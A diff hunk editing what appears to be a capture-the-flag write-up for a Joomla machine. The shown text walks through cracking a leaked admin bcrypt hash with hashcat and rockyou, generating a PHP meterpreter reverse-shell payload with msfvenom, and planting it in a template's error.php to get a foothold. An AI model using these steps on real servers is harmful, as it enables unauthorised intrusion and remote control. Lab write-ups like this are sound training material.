@@ -45,13 +45,13 @@ INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.
 ```
 BOOOM! we got admin credential. not that that password is hash using `bcrypt` (google "hashcat hash example" to define the hash). now use netcat to decryp the hash
 ```console
-hashcat -m 3200 -a 0 -o crack.txt '$2y$<hashherhe>' /usr/share/wordlists/rockyou.txt --force
+$ hashcat -m 3200 -a 0 -o crack.txt '$2y$<hashherhe>' /usr/share/wordlists/rockyou.txt --force
 ```
 now let login to to admin page use the credential we got. So the plan is try to get reverse shell to get foothold to the server. after some diggin I found [this](https://www.hackingarticles.in/joomla-reverse-shell/). I will go for msfvenom and msfconsole way since we might need to upload stuff in the further attack and msfconsole make it easier.
 
 start with create a meterpreter reverse shell using msfvenom
 ```
-msfvenom -p php/meterpreter/reverse_tcp lhost=$IP lport=1234 R
+msfvenom -p php/meterpreter/reverse_tcp lhost=tun0 lport=1234 R
 ```
 now back to joomla admin panel. go to *extensions* then *templates* -> *Beez3* -> and edit *error.php* with the payload that we generated with msfvenom. let go back to downloaded backup. note that you can find error.php at `/templates/beez3/error.php` so it should be the same way on the web page.
 
